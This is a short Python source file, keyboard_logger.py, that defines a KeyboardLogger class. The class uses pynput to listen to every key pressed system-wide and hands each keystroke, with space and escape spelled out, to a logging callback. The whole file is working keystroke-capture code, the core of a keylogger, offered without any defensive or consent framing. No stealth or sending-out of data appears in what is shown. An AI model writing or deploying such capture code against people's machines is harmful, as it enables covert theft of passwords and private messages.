# keyboard_logger.py
import logging
from pynput import keyboard
from pynput.keyboard import Listener

class KeyboardLogger:
    def __init__(self, append_log):
        self.append_log = append_log

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            keyboard_listener.join()
